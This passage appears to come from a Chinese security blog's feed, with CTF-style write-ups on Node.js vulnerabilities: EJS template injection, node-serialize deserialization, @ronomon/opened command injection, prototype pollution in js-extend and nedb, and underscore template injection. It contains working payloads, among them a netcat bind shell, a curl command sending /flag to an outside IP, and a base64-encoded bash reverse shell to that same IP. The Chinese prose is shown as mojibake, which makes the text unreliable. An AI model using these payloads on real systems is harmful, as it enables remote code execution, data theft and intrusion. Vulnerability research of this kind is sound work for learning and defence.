<p><img src="image-20210622204441790.png" alt="image-20210622204441790"></p>
<p><img src="image-20210622203030821.png" alt="image-20210622203030821"></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°outputFunctionNameï¼Œæ­£å¸¸è¿›è¡Œå‡½æ•°çš„è¯æ˜¯ç”±å¯¼å…¥çš„æ—¶å€™è¿›è¡Œçš„ï¼Œè€Œä¸€èˆ¬æ¥è¯´è¿™ä¸ªå€¼éƒ½æ˜¯ç©ºå€¼ã€‚</p>
<p><img src="image-20210622203903154.png" alt="image-20210622203903154"></p>
<p><img src="image-20210622203412682.png" alt="image-20210622203412682"></p>
<p>å¦‚æœç”±opts.outputFunctionNameçš„è¯ï¼Œæˆ‘ä»¬ä¼šç«‹åˆ»æ‰§è¡Œopt.outputFunctionName.ï¼Œä¹‹åæ‹¼æ¥è¿›å»ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿ä¼šæ‰§è¡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥æ„é€ ä¸º</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">x;<span class="built_in">console</span>.log(<span class="number">1</span>);process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc -lvp 4444 -e /bin/sh&#x27;</span>);x</span><br></pre></td></tr></table></figure>

<p>æ‹¼æ¥ä¹‹åå°±ä¼šå˜æˆï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">prepended += <span class="string">&#x27;  var x;console.log(1);process.mainModule.require(&quot;child_process&quot;).exec(&quot;nc -lvp 4444 -e /bin/sh&quot;);x = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™å°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç äº†ã€‚æœ€åä¼šæŠŠæˆ‘ä»¬çš„ä»£ç æ‰§è¡Œ</p>
<p><img src="image-20210622210339432.png" alt="image-20210622210339432"></p>
]]></content>
      <tags>
        <tag>node</tag>
        <tag>ä»£ç æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>nodeååºåˆ—åŒ–å­¦ä¹ </title>
    <url>/2021/06/22/node%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>å­¦ä¹ æ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;25581847</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜¯nodeæœ‰ååºåˆ—åŒ–ï¼Œå…¶å®æ˜¯ä¸€ä¸ªåº“çš„ååºåˆ—åŒ–æœ‰æ¼æ´ node-serialize</p>
<p>é€šè¿‡å®¡è®¡æºç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span>(<span class="params">key <span class="keyword">in</span> obj</span>)</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">obj.hasOwnProperty(key)</span>)</span> &#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params"><span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span></span>)</span> &#123;</span><br><span class="line">      obj[key] = <span class="built_in">exports</span>.unserialize(obj[key], originObj);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params"><span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;string&#x27;</span></span>)</span> &#123;</span><br><span class="line">      <span class="function"><span class="title">if</span>(<span class="params">obj[key].indexOf(FUNCFLAG) === <span class="number">0</span></span>)</span> &#123;</span><br><span class="line">        obj[key] = <span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + obj[key].substring(FUNCFLAG.length) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">obj[key].indexOf(CIRCULARFLAG) === <span class="number">0</span></span>)</span> &#123;</span><br><span class="line">        obj[key] = obj[key].substring(CIRCULARFLAG.length);</span><br><span class="line">        circularTasks.push(&#123;<span class="attr">obj</span>: obj, <span class="attr">key</span>: key&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>å½“indexOf(FUNCFLAG) ====0çš„æ—¶å€™å°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç äº†ã€‚å¹¶ä¸”æ‰§è¡Œçš„æ—¶å€™ä¼šæˆªå–å»é™¤æ‰FUNCFLAGçš„éƒ¨åˆ†ï¼Œå…¶å®è¿™æ ·å°±æ˜¯ä»»æ„ä»£ç æ‰§è¡Œäº†ï¼Œæä¸ªå­è¿›ç¨‹å‡ºæ¥</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;go&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;whoami &gt;&gt;1&#x27;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20210623113823031.png" alt="image-20210623113823031"></p>
<p><img src="image-20210623113843785.png" alt="image-20210623113843785"></p>
<p>ä½†æ˜¯å®é™…ç¯å¢ƒä¸‹æˆ‘ä»¬å¯èƒ½æ²¡æœ‰å†™å…¥çš„æƒé™ï¼Œæ‰€ä»¥å°è¯•æŠŠä»–åå¼¹å‡ºæ¥.. </p>
<p>ctfä¸­å¯ä»¥ç›´æ¥è¿™æ ·å­ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;go&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;curl http://81.69.201.65:1234/$(cat /flag|base64)&#x27;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>åå¼¹shellçš„è¯å¯ä»¥è¿™æ ·ï¼š</p>
<p>ç›´æ¥æ‰§è¡Œbashçš„è¯æˆ‘è¯•äº†è€åŠå¤©å‘ç°æ²¡å‘æˆåŠŸä¹Ÿä¸çŸ¥é“ä¸ºå•¥ï¼Œäºæ˜¯base64ä¸€ä¸‹</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;go&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo IGJhc2ggLWkgPiYgL2Rldi90Y3AvODEuNjkuMjAxLjY1LzEyMzQgMD4mMQ==|base64 -d|bash&#x27;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸgetshell</p>
<p><img src="image-20210623115037352.png" alt="image-20210623115037352"></p>
]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>æœ€è¿‘çš„nodeçš„æ¼æ´å¤ç°</title>
    <url>/2021/06/23/%E6%9C%80%E8%BF%91%E7%9A%84node%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1-ronomon-opened"><a href="#1-ronomon-opened" class="headerlink" title="1. @ronomon/opened"></a>1. @ronomon/opened</h1><p>è¿™ä¸ªæ¼æ´çš„åŸå› è¯ç”Ÿåº”è¯¥æ˜¯æœ€ç®€å•çš„å“ªä¸€ç±»äº†ï¼Œå®˜æ–¹ç»™äº†ä¸ªèŒƒä¾‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Opened = <span class="built_in">require</span>(<span class="string">&#x27;@ronomon/opened&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> paths = [<span class="string">&quot;/etc/passwd/$(cat /flag)&quot;</span>];</span><br><span class="line">Opened.files(paths,</span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params">error, hashTable</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (error) <span class="keyword">throw</span> error;</span><br><span class="line">    paths.forEach(</span><br><span class="line">      <span class="function"><span class="keyword">function</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(path + <span class="string">&#x27; open=&#x27;</span> + hashTable[path]);</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<p>æ‰“ä¸ªæ–­ç‚¹ï¼Œç›´æ¥å°±å¯ä»¥çœ‹è§</p>
<p><img src="image-20210623155443495.png" alt="image-20210623155443495"></p>
<p>ä½œè€…ä»…ä»…æ˜¯å¯¹åŒå¼•å·è¿›è¡Œäº†è¿‡æ»¤ï¼Œå…¶ä»–å•¥ä¹Ÿæ²¡ç®¡ï¼Œç„¶åå°±å‘½ä»¤æ‰§è¡Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è½»è€Œæ˜“ä¸¾çš„ä½¿ç”¨$()ç»•è¿‡ã€‚</p>
<p>getshell</p>
<p><img src="image-20210623155648977.png" alt="image-20210623155648977"></p>
<h1 id="2-js-extend"><a href="#2-js-extend" class="headerlink" title="2.js-extend"></a>2.js-extend</h1><p>è¿™ä¸ªçš„åº”è¯¥ç®—æ˜¯å¾ˆå¸¸è§çš„ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“çš„äº†ï¼Œå…ˆæ•´ä¸ªå®˜æ–¹çš„èŒƒä¾‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> extend = <span class="built_in">require</span>(<span class="string">&#x27;js-extend&#x27;</span>).extend</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> obj1 = &#123; <span class="attr">name</span>: <span class="string">&#x27;Jonny&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123; <span class="attr">lastName</span>: <span class="string">&#x27;Quest&#x27;</span> &#125;;</span><br><span class="line"> </span><br><span class="line">extend(obj1, obj2);</span><br><span class="line"><span class="built_in">console</span>.log(obj1);</span><br></pre></td></tr></table></figure>



<p>ç›´æ¥è¿›å»æ’¸æºç ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> extend = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> obj !== <span class="string">&#x27;object&#x27;</span>) <span class="keyword">throw</span> obj + <span class="string">&#x27; is not an object&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> sources = slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">  each.call(sources, <span class="function"><span class="keyword">function</span>(<span class="params">source</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">source</span>)</span> &#123;</span><br><span class="line">      <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> prop <span class="keyword">in</span> source</span>)</span> &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params"><span class="keyword">typeof</span> source[prop] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; obj[prop]</span>)</span> &#123;</span><br><span class="line">          extend.call(obj, obj[prop], source[prop]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          obj[prop] = source[prop];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<p>ç¨å¾®åˆ†æä¸€ä¸‹æºç ï¼Œå¯ä»¥ç†è§£ä¸ºè¿™æ®µæºç æ˜¯æ€ä¹ˆç»„åˆä¸¤ä¸ªjsonæ•°æ®çš„å‘¢ï¼Œé¦–å…ˆä½¿ç”¨sliceå°†æ•´ä¸ªæ•°ç»„åˆ†å¼€æ¥ï¼Œä¹‹åå¼€å§‹å¾ªç¯ç¬¬äºŒä¸ªæ•°ç»„ï¼Œ</p>
<p><img src="image-20210623180117467.png" alt="image-20210623180117467"></p>
<p>å…¶ä¸­objä¸ºç¬¬ä¸€ä¸ªæ•°ç»„ï¼Œsourcesä¸ºä¼ å…¥çš„ç¬¬äºŒä¸ªæ•°ç»„ï¼Œç„¶åè¿›è¡Œéå†ï¼Œåšå‡ºæ¥çš„æ“ä½œä¸º-ã€‹</p>
<p>å¦‚æœéå†åˆ°çš„sourcesä¸­çš„æŸä¸ªé”®ä¸ºobjectï¼Œåˆ™é€’å½’çš„ç»§ç»­éå†è¿™ä¸ªæ•°ç»„ï¼Œå¦‚æœä¸æ˜¯çš„è¯å°±ç›´æ¥å°†éå†åˆ°çš„keyå€¼çš„å±æ€§ä»˜ç»™ç¬¬ä¸€ä¸ªæ•°ç»„ã€‚</p>
<p>è¿™ä¸¤ä¸ªæ•°ç»„çš„è¯ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123; <span class="attr">name</span>: <span class="string">&#x27;Jonny&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123; <span class="attr">lastName</span>: <span class="string">&#x27;Quest&#x27;</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>ç¨‹åºä¼šå°è¯•éå†ç¬¬äºŒä¸ªæ•°ç»„ï¼Œä¹‹åå°†lastNameå±æ€§èµ‹å€¼ç»™obj1ã€‚å…¶ä¸­å¯¹äºobj2çš„å±æ€§åå­—æ²¡æœ‰åšå‡ºä»»ä½•è¿‡æ»¤ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœobjçš„æ•°ç»„ä¸ºï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">__proto__</span>:&#123;<span class="attr">add</span>:<span class="string">&quot;123&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å’Œä¸‹é¢çš„ä¸€æ®µä»£ç æ˜¯ç­‰æ•ˆçš„</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">a = &#123;&#125;</span><br><span class="line">a[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;polluted&#x27;</span>] = &#123;<span class="attr">polluted</span>:<span class="string">&quot;Yes! Its Polluted&quot;</span>&#125;[<span class="string">&#x27;polluted&#x27;</span>]</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.polluted);</span><br></pre></td></tr></table></figure>



<p><img src="image-20210623182923978.png" alt="image-20210623182923978"></p>
<h1 id="3-nedb"><a href="#3-nedb" class="headerlink" title="3.nedb"></a>3.nedb</h1><p>è¿™æ˜¯ä¸€ä¸ªè½»é‡çº§çš„nosqlæ•°æ®åº“ï¼ŒåµŒå…¥å¼æ•°æ®åº“ï¼Œï¼ˆå…¶å®å°±æ˜¯ä¸ªdbæ–‡ä»¶ï¼‰</p>
<p>å…·ä½“ä½¿ç”¨æƒ…å†µå¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> nedb = <span class="built_in">require</span>(<span class="string">&#x27;nedb&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> db = <span class="keyword">new</span> nedb(&#123;</span><br><span class="line">    filename: <span class="string">&#x27;./data/save.db&#x27;</span>,</span><br><span class="line">    autoload: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±ä¼šåˆ›å»ºä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶äº†ï¼Œæ’å…¥æ•°æ®ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.insert(</span><br><span class="line">    [</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&#x27;tom&#x27;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&#x27;jerry&#x27;</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">  , <span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢æ•°æ®ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.findOne(&#123;</span><br><span class="line">    name: <span class="string">&#x27;tom&#x27;</span></span><br><span class="line">  &#125;, <span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(ret);&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20210623200407967.png" alt="image-20210623200407967"></p>
<p>æŸ¥è¯¢çš„è¯åˆ™éœ€è¦å¼‚æ­¥çš„æ¥è¿›è¡Œä¸€ä¸ªæŸ¥è¯¢</p>
<p><img src="image-20210623200519003.png" alt="image-20210623200519003"></p>
<p>æŸ¥è¯¢å¤šé¡¹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.find(&#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">      $in: [<span class="string">&#x27;tom&#x27;</span>, <span class="string">&#x27;jerry&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .sort(&#123;</span><br><span class="line">    _id: -<span class="number">1</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .exec(<span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>



<p>å¦‚æœæ˜¯æŸ¥è¯¢å¤šé¡¹ï¼Œå°†ä¼šè¿”å›ä¸€ä¸ªæ•°ç»„ï¼š</p>
<p><img src="image-20210623200635912.png" alt="image-20210623200635912"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.update(&#123;</span><br><span class="line">  _id: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  $set: &#123;</span><br><span class="line">    name: <span class="string">&#x27;kitty&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;&#125;);</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>æ›´æ–°æŸä¸€é¡¹</p>
<p>åé¢çš„æ“ä½œéƒ½æ˜¯ç±»ä¼¼çš„ï¼Œå°±ä¸ä¸€ä¸€æ¼”ç¤ºäº†</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.remove(&#123;</span><br><span class="line">  _id: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;, <span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// åˆ é™¤å¤šé¡¹</span></span><br><span class="line">db.remove(&#123;</span><br><span class="line">  name: <span class="string">&#x27;kitty&#x27;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  multi: <span class="literal">true</span></span><br><span class="line">&#125;, <span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>



<p>å…¶å®åœ¨è¿™é‡Œä½¿ç”¨setçš„æ—¶å€™å°±éšéšçº¦çº¦æ„Ÿè§‰ä¸å¯¹äº†ï¼Œæœç„¶æ˜¯æœ‰æ´çš„</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Datastore = <span class="built_in">require</span>(<span class="string">&quot;nedb&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> db = <span class="keyword">new</span> Datastore();</span><br><span class="line">db.insert(&#123;<span class="attr">hello</span>: <span class="string">&#x27;world&#x27;</span>&#125;, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    db.update(&#123;<span class="attr">hello</span>: <span class="string">&#x27;world&#x27;</span>&#125;, &#123;<span class="attr">$set</span>: &#123;<span class="string">&#x27;__proto__.polluted_1&#x27;</span>: <span class="literal">true</span>&#125;&#125;, &#123;&#125;, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log((&#123;&#125;).polluted_1); <span class="comment">// true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    db.update(&#123;<span class="attr">hello</span>: <span class="string">&#x27;world&#x27;</span>&#125;, &#123;<span class="attr">$set</span>: &#123;<span class="string">&#x27;constructor.prototype.polluted_2&#x27;</span>: <span class="literal">true</span>&#125;&#125;, &#123;&#125;, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log((&#123;&#125;).polluted_2); <span class="comment">// true</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»–å¦ˆç›´æ¥å¼€å¯F5è¿›å»è°ƒ</p>
<p><img src="image-20210623213316885.png" alt="image-20210623213316885"></p>
<p>å‘ç°å¥¹çš„ä¿®æ”¹åŸç†å…¶å®å°±æ˜¯pushä»£ç ..æ‰€ä»¥å°±å‡ºç°äº†åŸå‹é“¾çš„é—®é¢˜ã€‚</p>
<p>æ„Ÿè§‰è¿™ä¸ªå¾ˆé€‚åˆç”¨äºå‡ºé¢˜ã€‚ã€‚</p>
<h1 id="4-systeminformation"><a href="#4-systeminformation" class="headerlink" title="4.systeminformation"></a>4.systeminformation</h1><p>ç‰ˆæœ¬éœ€æ±‚ï¼š</p>
<ul>
<li>å°äº5.6.4</li>
</ul>
<h2 id="si-inetLatency"><a href="#si-inetLatency" class="headerlink" title="si.inetLatency"></a>si.inetLatency</h2><p>è€æ ·å­ï¼Œæ ¹æ®èŒƒä¾‹éšä¾¿å†™æ®µä¸œè¥¿ç„¶åF5å¼€å§‹è°ƒ</p>
<p><img src="image-20210624101450880.png" alt="image-20210624101450880"></p>
<p>æ…¢æ…¢è·Ÿç€èµ°ï¼Œèƒ½å¤Ÿå‘ç°å…³é”®å‡½æ•°ï¼š</p>
<p><img src="image-20210624102057003.png" alt="image-20210624102057003"></p>
<p>å½“æˆ‘ä»¬æ˜¯linuxçš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡ŒpingæŒ‡ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.019 ms\n64 bytes from 127.0.0.1: icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;0.023 ms\n\n--- 127.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1015ms\nrtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.019&#x2F;0.021&#x2F;0.023&#x2F;0.002 ms\n&#39;</span><br></pre></td></tr></table></figure>



<p>é‡æ–°ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹è§æœ‰ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼š</p>
<p><img src="image-20210624102326703.png" alt="image-20210624102326703"></p>
<p>åŸæœ¬æƒ³è¯•è¯•çœ‹æ•°ç»„ç»•è¿‡çš„ï¼Œç»“æœå‘ç°è¿˜æœ‰è¿™ä¹ˆä¸€å¥è¯ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> host !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (callback) &#123; callback(<span class="literal">null</span>); &#125;</span><br><span class="line">        <span class="keyword">return</span> resolve(<span class="literal">null</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>



<p>è·Ÿè¿›å¯ä»¥å‘ç°è¿‡æ»¤å¦‚ä¸‹ï¼š</p>
<p><img src="image-20210624102338880.png" alt="image-20210624102338880"></p>
<p>æ„Ÿè§‰è¿™ä¸ªwafç»•ä¸è¿‡å»ï¼Œçœ‹çœ‹githubä¸Šçš„æäº¤</p>
<p><img src="image-20210624115015401.png" alt="image-20210624115015401"></p>
<p>å¯æ˜¯æ„Ÿè§‰è¿˜æ˜¯å¾ˆå®‰å…¨ï¼Œæˆ‘æ²¡åŠæ³•ç»•è¿‡è¿™ä¸ªå‡½æ•°ã€‚ã€‚ã€‚æ¬¸ï¼Œåæ¥åˆçœ‹åˆ°ä¸€ä¸ªå¤–å›½è€å“¥çš„æäº¤ï¼Œç»™äº†æˆ‘ä¸€äº›çµæ„Ÿï¼Œä»–æ˜¯è¿™æ ·å†™çš„ï¼š</p>
<p><img src="image-20210625210515048.png" alt="image-20210625210515048"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> si = <span class="built_in">require</span>(<span class="string">&#x27;systeminformation&#x27;</span>);</span><br><span class="line">si.versions(&#123;<span class="attr">toString</span> : <span class="function">() =&gt;</span> &#123; <span class="built_in">console</span>.log(<span class="string">&quot;This is a PoC&quot;</span>) &#125;&#125;);</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æåˆ°ï¼Œå¯¹ç±»å‹çš„checkä¸å¤Ÿï¼Œæ‰€ä»¥å¯¼è‡´å¯èƒ½ç»•è¿‡ã€‚å…¶ä¸­ç»™å‡ºçš„ç‰ˆæœ¬ä¸ºï¼šå°äº5.6.11ï¼Œå…ˆè¯•è¯•çœ‹â€”â€”</p>
<p><img src="image-20210625211214086.png" alt="image-20210625211214086"></p>
<p>ä¹‹ååˆæ ½åœ¨äº†è¿™é‡Œï¼Œæ„Ÿè§‰å¾ˆéš¾å—å•Šï¼Œè¿™å’‹åŠå‘¢ã€‚è¿™ä¸ªæé†’äº†æˆ‘toStringï¼Œçœ‹çœ‹jsçš„toStringå’ŒPHPçš„æ˜¯ä¸€ä¸ªä¸œè¥¿å—</p>
<p><img src="image-20210625211316818.png" alt="image-20210625211316818"></p>
<p>emmm</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> test = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test);;</span><br><span class="line"><span class="built_in">console</span>.log(test.toString());</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä¼šå¸¦æœ‰åŒºåˆ«</p>
<p><img src="image-20210625212325559.png" alt="image-20210625212325559"></p>
<p>toStringå°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡åŠæ³•å»è®¾å®štoStringçš„æ–¹æ³•ï¼Œå¥¹ä¹Ÿä¸ä¼šåœ¨æˆ‘ä»¬ç±»è¢«å½“ä½œå­—ç¬¦ä¸²å¤„ç†çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰åŒºåˆ«çš„ã€‚</p>
<h1 id="5-underscore"><a href="#5-underscore" class="headerlink" title="5.underscore"></a>5.underscore</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p><a href="https://www.npmjs.org/package/underscore">underscore</a>æ˜¯ JavaScript çš„å‡½æ•°å¼ç¼–ç¨‹åŠ©æ‰‹åº“ã€‚</p>
<p>æ­¤è½¯ä»¶åŒ…çš„å—å½±å“ç‰ˆæœ¬å®¹æ˜“å—åˆ°é€šè¿‡è¯¥<code>template</code>å‡½æ•°è¿›è¡Œçš„ä»»æ„ä»£ç æ³¨å…¥çš„æ”»å‡»ï¼Œç‰¹åˆ«æ˜¯å½“è¯¥<code>variable</code>é€‰é¡¹<code>_.templateSettings</code>å› æœªç»è¿‡æ¸…ç†è€Œè¢«æå–æ—¶ã€‚</p>
<h2 id="ç‰ˆæœ¬"><a href="#ç‰ˆæœ¬" class="headerlink" title="ç‰ˆæœ¬"></a>ç‰ˆæœ¬</h2><p>1.12.0</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;underscore&#x27;</span>);</span><br><span class="line">_.templateSettings.variable = <span class="string">&quot;a = this.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch HELLO&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> t = _.template(<span class="string">&quot;&quot;</span>)();</span><br></pre></td></tr></table></figure>



<h2 id="å¤ç°è¿‡ç¨‹ï¼š"><a href="#å¤ç°è¿‡ç¨‹ï¼š" class="headerlink" title="å¤ç°è¿‡ç¨‹ï¼š"></a>å¤ç°è¿‡ç¨‹ï¼š</h2><p>å…ˆç¿»ä¸€æ‰‹å®˜æ–¹æ–‡æ¡£ï¼Œçœ‹çœ‹æ­£å¸¸çš„æƒ…å†µæ˜¯æ€ä¹ˆç”¨è¿™ä¸ªå‡½æ•°çš„ï¼š</p>
